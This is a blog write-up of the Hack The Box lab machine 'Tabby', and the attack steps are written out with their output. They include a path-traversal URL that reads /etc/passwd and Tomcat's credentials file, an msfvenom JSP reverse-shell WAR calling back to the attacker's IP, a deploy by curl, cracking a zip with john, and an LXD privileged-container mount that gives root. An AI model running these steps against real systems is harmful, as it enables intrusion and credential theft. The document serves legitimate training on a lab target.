---
layout: post
author: Siddhant Chouhan
title: Hack The Box Tabby Writeup
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, tabby, ctf, lfi, local-file-inclusion, tomcat, php, creds, users, text-manager, msfvenom, curl, war, john, zip2john, password-reuse, hash, lxd, lxc, container ]
image: /assets/img/Posts/Tabby.png
---
## Overview:

The box starts with us finding a <code class="language-plaintext highlighter-rouge">Local File Inclusion Vulnerability<code> on port 80 and we have <code class="language-plaintext highlighter-rouge">tomcat</code> running on port 8080 ,so we can use the LFI vulnerability to find credentials for tomcat's manager application.Then we get a shell on the box by a malicious <code class="language-plaintext highlighter-rouge">WAR file upload</code>. We find a password protected zip file in the /var/www/html/files directory,on cracking the zip file with the help of <code class="language-plaintext highlighter-rouge">john the ripper</code> we get the password for the user ash. Turns out the user ash is part of the <code class="language-plaintext highlighter-rouge">lxd</code> group which can be exploited and we root the box. 
  
## Reconnaissance
### Nmap Scan
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ nmap -sC -sV 10.10.10.194 -oN nmap_scan

# Nmap 7.80 scan initiated Fri Nov  6 23:05:38 2020 as: nmap -sC -sV -oN nmap_scan -v 10.10.10.194
Increasing send delay for 10.10.10.194 from 5 to 10 due to 18 out of 58 dropped probes since last increase.
Increasing send delay for 10.10.10.194 from 10 to 20 due to 11 out of 28 dropped probes since last increase.
Nmap scan report for 10.10.10.194
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  6 23:06:56 2020 -- 1 IP address (1 host up) scanned in 77.58 seconds
```
### Port 80
<p class= "aligncenter" >
  <img src="/assets/images/tabby-port80.png" class="center">
</p>

On opening the news tab, we notice that the url of the page is "http://megahosting.htb/news.php?file=statement".
So we will add megahosting.htb to our /etc/hosts file.
The url of this page also indicates a possible Local File Inclusion Vulnerability.<br>
Let's confirm this by reading /etc/passwd since in every linux system it is readable by all the users.<br>
"http://megahosting.htb/news.php?file=../../../../etc/passwd" 
<p class= "aligncenter" >
  <img src="/assets/images/tabby-lfi-confimed.png" class="center">
</p>
Also we note that there is a user on the box named ash.
### Port 8080
<p class= "aligncenter" >
  <img src="/assets/images/tabby-port8080.png" class="center">
</p>
This is the default page for tomcat, and it says that this instance of tomcat is installed in "/usr/share/tomcat9"<br>
NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in "/etc/tomcat9/tomcat-users.xml".<br>


So we have a LFI vulnerability and we know that the credentials for the tomcat manager webapp are in the file /etc/tomcat9/tomcat-users.xml and that tomcat is installed in /usr/share/tomcat9. We can install tomcat9 on our system and see where the tomcat-users.xml file will be present.<br>
So the file we want to read is present at /usr/share/tomcat9/etc/tomcat-users.xml.

Let's get the credentials now. We get a blank page but if we view the source code of the page we find that we have successfully found the file and we get the tomcat manager credentials and we can see that we have the roles "admin-gui,manager-script".

<p class= "aligncenter" >
  <img src="/assets/images/tabby-tomcat-users-xml.png" class="center">
</p>
We can't access the manager-gui to upload a malicious WAR file but we still can use curl to upload since we have the manager-script role.
## Using msfvenom to create a WAR file reverse shell.
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.9 lport=4444 -f war > sid.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of war file: 1617 bytes
```
Let's upload this with help of curl.
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T sid.war 'http://10.10.10.194:8080/manager/text/deploy?path=/a.war'
OK - Deployed application at context path [/a.war]
```
Starting up a netcat listner on port 4444. Then visitng "http://10.10.10.194:8080/a.war" to get our reverse shell.
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ rlwrap nc -lvnp 4444                                                                                                         1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.194] 49454
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ 
```
## Getting the user flag
We find a zip file which was password protected, transfer the file to our machine with help of netcat and cracked it by using john the ripper.
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ zip2john 16162020_backup.zip  > hash

┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ cat hash
16162020_backup.zip:$pkzip2$3*2*1*0*0*24*02f9*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*285c*5935*f422c
178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5c67*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8
e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e
11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip2$::16162020_backup.zip:var/www/html/news.php, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip

┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:01 DONE (2020-11-07 21:21) 0.5154g/s 5341Kp/s 5341Kc/s 5341KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We cracked the zip file and the password is `admin@it`. Turns out this is the password for the user ash as well.
```shell
tomcat@tabby:/var/www/html/files$ su ash
su ash
Password: admin@it

ash@tabby:/var/www/html/files$ whoami
whoami
ash
ash@tabby:/var/www/html/files$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:/var/www/html/files$ cd /home/ash
ash@tabby:~$ cat user.txt
cat user.txt
70d7a301277d4285e8ff1ff443b3c77b
```
## Privilege escalation
We see that the user ash is part of the lxd group. On googling lxd priv esc, came across this [article](https://www.hackingarticles.in/lxd-privilege-escalation/).
Now we just have to follow the commands as it is in the article and we are able to get root!
```shell
┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ git clone https://github.com/saghul/lxd-alpine-builder.git 

Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Unpacking objects: 100% (27/27), 15.98 KiB | 1.60 MiB/s, done.

┌──(sid㉿kali)-[~/…/flags/hackthebox/linux-machines/tabby]
└─$ cd lxd-alpine-builder

┌──(sid㉿kali)-[~/…/hackthebox/linux-machines/tabby/lxd-alpine-builder]
└─$ sudo ./build-alpine

┌──(sid㉿kali)-[~/…/hackthebox/linux-machines/tabby/lxd-alpine-builder]
└─$ ls
alpine-v3.12-x86_64-20201107_2130.tar.gz  build-alpine  LICENSE  README.md

┌──(sid㉿kali)-[~/…/hackthebox/linux-machines/tabby/lxd-alpine-builder]
└─$ python3 -m http.server 7777
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...

```
On tabby :

```shell
ash@tabby:~$ wget http://10.10.14.9:7777/alpine-v3.12-x86_64-20201107_2130.tar.gz
Connecting to 10.10.14.9:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3194011 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20201107_2130.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.05M  2.57MB/s    in 1.2s    

2020-11-07 16:21:28 (2.57 MB/s) - ‘alpine-v3.12-x86_64-20201107_2130.tar.gz’ saved [3194011/3194011]

ash@tabby:~$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: no
no
Do you want to configure a new storage pool? (yes/no) [default=yes]: no
no
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
no
Would you like to create a new local network bridge? (yes/no) [default=yes]: no
no
Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: no
no
Would you like LXD to be available over the network? (yes/no) [default=no]: no
no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] no
no
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
no

ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20201107_2130.tar.gz --alias myimage
lxc image import ./alpine-v3.12-x86_64-20201107_2130.tar.gz --alias myimage
ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| alpine  | fa5b049986a5 | no     | Alpinelinux 3.12 x86_64 (20201107_1032) | x86_64       | CONTAINER | 2.40MB | Nov 7, 2020 at 10:55am (UTC) |
+---------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| myimage | eca77d19af30 | no     | alpine v3.12 (20201107_21:30)           | x86_64       | CONTAINER | 3.05MB | Nov 7, 2020 at 4:51pm (UTC)  |
+---------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+

ash@tabby:~$ lxc init myimage sidchn -c security.privileged=true
lxc init myimage sidchn -c security.privileged=true
Creating sidchn
ash@tabby:~$ lxc config device add sidchn mydevice disk source=/ path=/mnt/root recursive=true
lxc config device add sidchn mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to sidchn
ash@tabby:~$ lxc start sidchn
lxc start sidchn
ash@tabby:~$ lxc exec sidchn /bin/sh
lxc exec sidchn /bin/sh
~ # whoami
whoami
root
~ # id
id
uid=0(root) gid=0(root)

~ # cd /mnt/root/root
cd /mnt/root/root
/mnt/root/root # cat root.txt
cat root.txt
6ab5823df58c34e18f93b8cccb0d28d7
/mnt/root/root #
```
And that was the box, hope you learned something new :D

